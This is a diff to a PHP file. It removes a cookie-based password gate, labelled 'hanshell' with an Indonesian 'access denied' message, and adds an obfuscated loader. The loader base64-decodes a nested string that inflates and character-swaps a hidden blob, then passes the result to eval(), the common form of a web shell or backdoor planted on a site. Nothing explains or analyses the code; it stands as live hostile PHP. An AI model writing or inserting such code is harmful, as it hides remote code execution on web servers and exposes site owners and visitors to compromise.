@@ -1,12 +1,5 @@
 <?php
-$valid_cookie_value = 'cmF5Z2Fucw=='; // base64 encoded 'raygans'
-if (!isset($_COOKIE['hanshell']) || base64_decode($_COOKIE['hanshell']) !== $valid_cookie_value) {
-    echo '<script>
-            alert("Akses ditolak! Silakan Login.");
-            window.location.href = window.location.origin;
-          </script>';
-    exit();
-} 
+$SISTEMIT_COM_ENC = "hZCxasNADIZ3gx/CIXDO4j6Ak0IpHUILGTqW4sGQDD5M8JKWpA8TChnO3OBBk7hF/4tV5wwpBVM0SEj//fp0aTIHIVg4XKoaDG609NW1+Q0vtBIyHcLnDqHFYMo0gdsK5ZkKBw2PPp9Xj5vN8/rpzeA8yjR5a837Quh0EpqcC2UrXfAPhLoc00ToGvC1PmfFWmKoO7g9+vvb+G9ED98p5OyhGXEH7V10QQ+2CE0m9AoXKyUTegHv4NpitiinPQ+qUA8+FBZcI6iXA7cFzh38dvyzSQkrcdwwYb+8ux1lyt9Xf0TmPGJ9pckP";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdDZ29KQ1Fra2MzUnlJRDBnV3lmRHZTY3NKOE9xSnl3bnc2TW5MQ2ZEclNjc0o4TzdKeXdudzZZbkxDZkRzU2NzSjhPaEp5d253N1VuTENmRHF5Y3NKOEsxSjEwN0Nna0pDU1J5Y0d4aklEMWJKMkVuTENkcEp5d25kU2NzSjJVbkxDZHZKeXduWkNjc0ozTW5MQ2RvSnl3bmRpY3NKM1FuTENjZ0oxMDdDZ2tKSUNBa2JtRjJJRDBnYzNSeVgzSmxjR3hoWTJVb0pITjBjaXdrY25Cc1l5d2tibUYyS1RzS0Nna0pDV1YyWVd3b0pHNWhkaWs3");eval(base64_decode($rand));$STOP="DIZ3gx/CIXDO4j6Ak0IpHUILGTqW4sGQDD5M8JKWpA8TChnO3OBBk7hF/4tV5wwpBVM0SEj//fp0aTIHIVg4XKoaDG609NW1+Q0vtBIyHcLnDqHFYMo0gdsK5ZkKBw2PPp9Xj5vN8/rpzeA8yjR5a837Quh0EpqcC2UrXfAPhLoc00ToGvC1PmfFWmKoO7g9+vvb+G9E";
 ?>
 
 
